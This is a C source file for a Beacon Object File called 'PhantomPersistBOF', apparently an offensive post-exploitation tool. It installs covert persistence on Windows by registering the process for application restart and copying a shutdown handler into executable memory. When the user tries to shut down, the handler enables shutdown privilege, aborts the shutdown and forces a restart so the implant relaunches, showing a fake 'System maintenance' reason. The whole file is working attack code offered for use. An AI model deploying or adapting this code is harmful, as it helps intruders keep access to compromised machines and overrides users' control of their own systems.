#include <windows.h>
#include "bofdefs.h"
#include "base.c"

#define ACTION_INSTALL 1
#define ACTION_STATUS  2
#define ACTION_REMOVE  3
#define STOP_MESSAGE   (WM_APP + 0x315)
#define INIT_WAIT_MS   5000

#ifndef ENDSESSION_CLOSEAPP
#define ENDSESSION_CLOSEAPP 0x00000001
#endif
#ifndef EWX_RESTARTAPPS
#define EWX_RESTARTAPPS 0x00000040
#endif
#ifndef SHUTDOWN_NORETRY
#define SHUTDOWN_NORETRY 0x00000001
#endif
#ifndef SHTDN_REASON_MAJOR_OTHER
#define SHTDN_REASON_MAJOR_OTHER 0
#endif
#ifndef SHTDN_REASON_MINOR_OTHER
#define SHTDN_REASON_MINOR_OTHER 0
#endif

static const WCHAR WINDOW_CLASS[] = L"PhantomPersistBOF_6bfe0e1c";
static const WCHAR WINDOW_TITLE[] = L"PhantomPersistBOF";
static const WCHAR BLOCK_REASON[] = L"System maintenance is completing.";

typedef struct _RUNTIME_CONTEXT RUNTIME_CONTEXT;

typedef HMODULE (WINAPI *PFN_GETMODULEHANDLEW)(LPCWSTR);
typedef ATOM (WINAPI *PFN_REGISTERCLASSEXW)(const WNDCLASSEXW *);
typedef BOOL (WINAPI *PFN_UNREGISTERCLASSW)(LPCWSTR, HINSTANCE);
typedef HWND (WINAPI *PFN_CREATEWINDOWEXW)(DWORD,LPCWSTR,LPCWSTR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
typedef LRESULT (WINAPI *PFN_DEFWINDOWPROCW)(HWND,UINT,WPARAM,LPARAM);
typedef BOOL (WINAPI *PFN_DESTROYWINDOW)(HWND);
typedef VOID (WINAPI *PFN_POSTQUITMESSAGE)(int);
typedef BOOL (WINAPI *PFN_GETMESSAGEW)(LPMSG,HWND,UINT,UINT);
typedef BOOL (WINAPI *PFN_TRANSLATEMESSAGE)(const MSG *);
typedef LRESULT (WINAPI *PFN_DISPATCHMESSAGEW)(const MSG *);
typedef BOOL (WINAPI *PFN_SETPROCESSSHUTDOWNPARAMETERS)(DWORD,DWORD);
typedef BOOL (WINAPI *PFN_SHUTDOWNBLOCKREASONCREATE)(HWND,LPCWSTR);
typedef BOOL (WINAPI *PFN_SHUTDOWNBLOCKREASONDESTROY)(HWND);
typedef BOOL (WINAPI *PFN_ABORTSYSTEMSHUTDOWNW)(LPWSTR);
typedef BOOL (WINAPI *PFN_EXITWINDOWSEX)(UINT,DWORD);
typedef HANDLE (WINAPI *PFN_GETCURRENTPROCESS)(VOID);
typedef BOOL (WINAPI *PFN_OPENPROCESSTOKEN)(HANDLE,DWORD,PHANDLE);
typedef BOOL (WINAPI *PFN_LOOKUPPRIVILEGEVALUEA)(LPCSTR,LPCSTR,PLUID);
typedef BOOL (WINAPI *PFN_ADJUSTTOKENPRIVILEGES)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
typedef BOOL (WINAPI *PFN_CLOSEHANDLE)(HANDLE);
typedef DWORD (WINAPI *PFN_GETLASTERROR)(VOID);
typedef VOID (WINAPI *PFN_SETLASTERROR)(DWORD);

struct _RUNTIME_CONTEXT {
    WNDPROC wndProc;
    volatile LONG initState;
    volatile LONG stopping;
    volatile LONG replacementStarted;
    volatile DWORD lastError;
    HWND window;
    WCHAR className[64];
    WCHAR windowTitle[64];
    WCHAR blockReason[128];
    CHAR privilegeName[32];
    PFN_GETMODULEHANDLEW pGetModuleHandleW;
    PFN_REGISTERCLASSEXW pRegisterClassExW;
    PFN_UNREGISTERCLASSW pUnregisterClassW;
    PFN_CREATEWINDOWEXW pCreateWindowExW;
    PFN_DEFWINDOWPROCW pDefWindowProcW;
    PFN_DESTROYWINDOW pDestroyWindow;
    PFN_POSTQUITMESSAGE pPostQuitMessage;
    PFN_GETMESSAGEW pGetMessageW;
    PFN_TRANSLATEMESSAGE pTranslateMessage;
    PFN_DISPATCHMESSAGEW pDispatchMessageW;
    PFN_SETPROCESSSHUTDOWNPARAMETERS pSetProcessShutdownParameters;
    PFN_SHUTDOWNBLOCKREASONCREATE pShutdownBlockReasonCreate;
    PFN_SHUTDOWNBLOCKREASONDESTROY pShutdownBlockReasonDestroy;
    PFN_ABORTSYSTEMSHUTDOWNW pAbortSystemShutdownW;
    PFN_EXITWINDOWSEX pExitWindowsEx;
    PFN_GETCURRENTPROCESS pGetCurrentProcess;
    PFN_OPENPROCESSTOKEN pOpenProcessToken;
    PFN_LOOKUPPRIVILEGEVALUEA pLookupPrivilegeValueA;
    PFN_ADJUSTTOKENPRIVILEGES pAdjustTokenPrivileges;
    PFN_CLOSEHANDLE pCloseHandle;
    PFN_GETLASTERROR pGetLastError;
    PFN_SETLASTERROR pSetLastError;
};

extern BYTE RuntimeStart[];
extern BYTE RuntimeEnd[];
extern PVOID RuntimeContextSlot;
extern RUNTIME_CONTEXT *RuntimeGetContext(VOID);

#define RUNTIME_CODE __attribute__((section(".runtime"), noinline, used))

static RUNTIME_CODE BOOL RuntimeEnableShutdownPrivilege(RUNTIME_CONTEXT *ctx)
{
    HANDLE token = NULL;
    TOKEN_PRIVILEGES tp;
    DWORD error;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ctx->pOpenProcessToken(ctx->pGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        ctx->lastError = ctx->pGetLastError();
        return FALSE;
    }
    if (!ctx->pLookupPrivilegeValueA(NULL, ctx->privilegeName, &tp.Privileges[0].Luid)) {
        ctx->lastError = ctx->pGetLastError();
        ctx->pCloseHandle(token);
        return FALSE;
    }
    ctx->pSetLastError(ERROR_SUCCESS);
    if (!ctx->pAdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL)) {
        ctx->lastError = ctx->pGetLastError();
        ctx->pCloseHandle(token);
        return FALSE;
    }
    error = ctx->pGetLastError();
    ctx->pCloseHandle(token);
    if (error != ERROR_SUCCESS)
        ctx->lastError = error;
    return error == ERROR_SUCCESS;
}

RUNTIME_CODE LRESULT CALLBACK RuntimeWndProc(HWND window, UINT message, WPARAM wParam, LPARAM lParam)
{
    RUNTIME_CONTEXT *ctx = RuntimeGetContext();
    BOOL blocked;

    if (!ctx)
        return 0;
    if (message == STOP_MESSAGE) {
        ctx->stopping = 1;
        ctx->pDestroyWindow(window);
        return 0;
    }
    if (message == WM_DESTROY) {
        ctx->window = NULL;
        ctx->pPostQuitMessage(0);
        return 0;
    }
    if (message == WM_QUERYENDSESSION) {
        if (ctx->stopping)
            return TRUE;
        if (ctx->replacementStarted)
            return TRUE;
        ctx->replacementStarted = 1;
        if (!RuntimeEnableShutdownPrivilege(ctx)) {
            ctx->replacementStarted = 0;
            return FALSE;
        }
        blocked = ctx->pShutdownBlockReasonCreate(window, ctx->blockReason);
        if (!ctx->pAbortSystemShutdownW(NULL))
            ctx->lastError = ctx->pGetLastError();
        if (blocked)
            ctx->pShutdownBlockReasonDestroy(window);
        if (!ctx->pExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE,
                SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER)) {
            ctx->lastError = ctx->pGetLastError();
            ctx->replacementStarted = 0;
            return FALSE;
        }
        return TRUE;
    }
    if (message == WM_ENDSESSION && wParam)
        ctx->pShutdownBlockReasonDestroy(window);
    return ctx->pDefWindowProcW(window, message, wParam, lParam);
}

RUNTIME_CODE DWORD WINAPI RuntimeThread(LPVOID parameter)
{
    RUNTIME_CONTEXT *ctx = (RUNTIME_CONTEXT *)parameter;
    HINSTANCE instance;
    WNDCLASSEXW wc;
    MSG msg;
    int result;

    instance = ctx->pGetModuleHandleW(NULL);
    wc.cbSize = sizeof(wc);
    wc.style = 0;
    wc.lpfnWndProc = ctx->wndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = instance;
    wc.hIcon = NULL;
    wc.hCursor = NULL;
    wc.hbrBackground = NULL;
    wc.lpszMenuName = NULL;
    wc.lpszClassName = ctx->className;
    wc.hIconSm = NULL;
    if (!ctx->pRegisterClassExW(&wc)) {
        ctx->lastError = ctx->pGetLastError();
        ctx->initState = -1;
        return 1;
    }
    ctx->window = ctx->pCreateWindowExW(0, ctx->className, ctx->windowTitle,
        WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, instance, NULL);
    if (!ctx->window) {
        ctx->lastError = ctx->pGetLastError();
        ctx->pUnregisterClassW(ctx->className, instance);
        ctx->initState = -1;
        return 1;
    }
    if (!ctx->pSetProcessShutdownParameters(0x4ff, SHUTDOWN_NORETRY) &&
        !ctx->pSetProcessShutdownParameters(0x400, SHUTDOWN_NORETRY) &&
        !ctx->pSetProcessShutdownParameters(0x3ff, SHUTDOWN_NORETRY))
        ctx->lastError = ctx->pGetLastError();
    ctx->initState = 1;
    while ((result = ctx->pGetMessageW(&msg, NULL, 0, 0)) > 0) {
        ctx->pTranslateMessage(&msg);
        ctx->pDispatchMessageW(&msg);
    }
    ctx->pUnregisterClassW(ctx->className, instance);
    return 0;
}

static VOID CopyWide(WCHAR *destination, DWORD count, const WCHAR *source)
{
    DWORD i;
    for (i = 0; i + 1 < count && source[i]; i++)
        destination[i] = source[i];
    destination[i] = L'\0';
}

static VOID CopyAnsi(CHAR *destination, DWORD count, const CHAR *source)
{
    DWORD i;
    for (i = 0; i + 1 < count && source[i]; i++)
        destination[i] = source[i];
    destination[i] = '\0';
}

static VOID PrintStatus(VOID)
{
    WCHAR arguments[1024] = {0};
    WCHAR path[MAX_PATH] = {0};
    FILETIME creation, exitTime, kernelTime, userTime, now;
    DWORD ageHigh, ageLow;
    DWORD count = 1024, flags = 0;
    HRESULT hr;

    KERNEL32$GetModuleFileNameW(NULL, path, MAX_PATH);
    hr = KERNEL32$GetApplicationRestartSettings(KERNEL32$GetCurrentProcess(), arguments, &count, &flags);
    internal_printf("[*] Current executable: %S\n", path);
    if (SUCCEEDED(hr))
        internal_printf("[+] Restart registered; arguments: %S; flags: 0x%lx\n", arguments, flags);
    else
        internal_printf("[-] Restart is not registered (0x%08lx)\n", hr);
    internal_printf("[*] Resident shutdown handler: %s\n",
        USER32$FindWindowW(WINDOW_CLASS, WINDOW_TITLE) ? "installed" : "not installed");
    if (KERNEL32$GetProcessTimes(KERNEL32$GetCurrentProcess(), &creation, &exitTime, &kernelTime, &userTime)) {
        KERNEL32$GetSystemTimeAsFileTime(&now);
        ageLow = now.dwLowDateTime - creation.dwLowDateTime;
        ageHigh = now.dwHighDateTime - creation.dwHighDateTime - (now.dwLowDateTime < creation.dwLowDateTime);
        if (ageHigh)
            internal_printf("[*] Process runtime: restart eligible (over 429 seconds)\n");
        else
            internal_printf("[*] Process runtime: %lu seconds%s\n", ageLow / 10000000UL,
                ageLow >= 600000000UL ? " (restart eligible)" : " (under the 60-second minimum)");
    }
}

static BOOL InstallHandler(VOID)
{
    SIZE_T runtimeSize, contextOffset, allocationSize;
    SIZE_T slotOffset, wndProcOffset, threadOffset;
    BYTE *runtimeSource;
    BYTE *memory;
    RUNTIME_CONTEXT *ctx;
    PVOID *slot;
    HANDLE thread;
    DWORD waited;

    if (USER32$FindWindowW(WINDOW_CLASS, WINDOW_TITLE))
        return TRUE;
#ifdef _WIN64
    extern BYTE *RuntimeSource(VOID);
    DWORD *metadata;
    runtimeSource = RuntimeSource();
    metadata = (DWORD *)runtimeSource;
    runtimeSize = metadata[0];
    slotOffset = metadata[1];
    wndProcOffset = metadata[2];
    threadOffset = metadata[3];
#else
    runtimeSource = RuntimeStart;
    runtimeSize = (SIZE_T)(RuntimeEnd - RuntimeStart);
    slotOffset = (SIZE_T)((BYTE *)&RuntimeContextSlot - RuntimeStart);
    wndProcOffset = (SIZE_T)((BYTE *)RuntimeWndProc - RuntimeStart);
    threadOffset = (SIZE_T)((BYTE *)RuntimeThread - RuntimeStart);
#endif
    contextOffset = (runtimeSize + 15) & ~(SIZE_T)15;
    allocationSize = contextOffset + sizeof(RUNTIME_CONTEXT);
    if (!runtimeSize || runtimeSize > 65536)
        return FALSE;
    memory = (BYTE *)KERNEL32$VirtualAlloc(NULL, allocationSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!memory)
        return FALSE;
    MSVCRT$memcpy(memory, runtimeSource, runtimeSize);
    ctx = (RUNTIME_CONTEXT *)(memory + contextOffset);
    MSVCRT$memset(ctx, 0, sizeof(*ctx));
    slot = (PVOID *)(memory + slotOffset);
    *slot = ctx;
    ctx->wndProc = (WNDPROC)(memory + wndProcOffset);
    CopyWide(ctx->className, 64, WINDOW_CLASS);
    CopyWide(ctx->windowTitle, 64, WINDOW_TITLE);
    CopyWide(ctx->blockReason, 128, BLOCK_REASON);
    CopyAnsi(ctx->privilegeName, 32, "SeShutdownPrivilege");
    ctx->pGetModuleHandleW = KERNEL32$GetModuleHandleW;
    ctx->pRegisterClassExW = USER32$RegisterClassExW;
    ctx->pUnregisterClassW = USER32$UnregisterClassW;
    ctx->pCreateWindowExW = USER32$CreateWindowExW;
    ctx->pDefWindowProcW = USER32$DefWindowProcW;
    ctx->pDestroyWindow = USER32$DestroyWindow;
    ctx->pPostQuitMessage = USER32$PostQuitMessage;
    ctx->pGetMessageW = USER32$GetMessageW;
    ctx->pTranslateMessage = USER32$TranslateMessage;
    ctx->pDispatchMessageW = USER32$DispatchMessageW;
    ctx->pSetProcessShutdownParameters = KERNEL32$SetProcessShutdownParameters;
    ctx->pShutdownBlockReasonCreate = USER32$ShutdownBlockReasonCreate;
    ctx->pShutdownBlockReasonDestroy = USER32$ShutdownBlockReasonDestroy;
    ctx->pAbortSystemShutdownW = (PFN_ABORTSYSTEMSHUTDOWNW)ADVAPI32$AbortSystemShutdownW;
    ctx->pExitWindowsEx = USER32$ExitWindowsEx;
    ctx->pGetCurrentProcess = KERNEL32$GetCurrentProcess;
    ctx->pOpenProcessToken = ADVAPI32$OpenProcessToken;
    ctx->pLookupPrivilegeValueA = ADVAPI32$LookupPrivilegeValueA;
    ctx->pAdjustTokenPrivileges = ADVAPI32$AdjustTokenPrivileges;
    ctx->pCloseHandle = KERNEL32$CloseHandle;
    ctx->pGetLastError = KERNEL32$GetLastError;
    ctx->pSetLastError = KERNEL32$SetLastError;
    thread = KERNEL32$CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)(memory + threadOffset), ctx, 0, NULL);
    if (!thread)
        return FALSE;
    KERNEL32$CloseHandle(thread);
    for (waited = 0; waited < INIT_WAIT_MS && ctx->initState == 0; waited += 10)
        KERNEL32$Sleep(10);
    if (ctx->initState != 1) {
        internal_printf("[!] Handler initialization failed or timed out: %lu\n", ctx->lastError);
        return FALSE;
    }
    if (ctx->lastError)
        internal_printf("[!] Handler installed with shutdown-priority warning: %lu\n", ctx->lastError);
    return TRUE;
}

static VOID RunAction(INT action, WCHAR *restartArguments)
{
    HRESULT hr;
    HWND window;

    if (action == ACTION_INSTALL) {
        if (!restartArguments)
            restartArguments = L"";
        hr = KERNEL32$RegisterApplicationRestart(restartArguments, 0);
        if (FAILED(hr)) {
            internal_printf("[!] RegisterApplicationRestart failed: 0x%08lx\n", hr);
            return;
        }
        if (!InstallHandler()) {
            KERNEL32$UnregisterApplicationRestart();
            internal_printf("[!] Registration rolled back because the resident handler failed\n");
            return;
        }
        internal_printf("[+] Phantom persistence installed with restart arguments: %S\n", restartArguments);
        PrintStatus();
        return;
    }
    if (action == ACTION_STATUS) {
        PrintStatus();
        return;
    }
    if (action == ACTION_REMOVE) {
        window = USER32$FindWindowW(WINDOW_CLASS, WINDOW_TITLE);
        if (window)
            USER32$PostMessageW(window, STOP_MESSAGE, 0, 0);
        hr = KERNEL32$UnregisterApplicationRestart();
        if (FAILED(hr))
            internal_printf("[!] UnregisterApplicationRestart failed: 0x%08lx\n", hr);
        else
            internal_printf("[+] Restart registration removed\n");
        return;
    }
    internal_printf("[!] Usage: action 1=install, 2=status, 3=remove; install accepts optional UTF-16 arguments\n");
}

#ifdef BOF
VOID go(IN PCHAR Args, IN ULONG Length)
{
    datap parser;
    INT action;
    WCHAR *restartArguments = NULL;

    if (!bofstart())
        return;
    BeaconDataParse(&parser, Args, Length);
    action = BeaconDataInt(&parser);
    if (action == ACTION_INSTALL)
        restartArguments = (WCHAR *)BeaconDataExtract(&parser, NULL);
    RunAction(action, restartArguments);
    printoutput(TRUE);
}
#else
int wmain(int argc, WCHAR **argv)
{
    INT action = ACTION_STATUS;
    if (argc > 1 && argv[1][0] == L'i') action = ACTION_INSTALL;
    else if (argc > 1 && argv[1][0] == L'r') action = ACTION_REMOVE;
    RunAction(action, argc > 2 ? argv[2] : NULL);
    if (action == ACTION_INSTALL)
        while (USER32$FindWindowW(WINDOW_CLASS, WINDOW_TITLE)) KERNEL32$Sleep(1000);
    return 0;
}
#endif
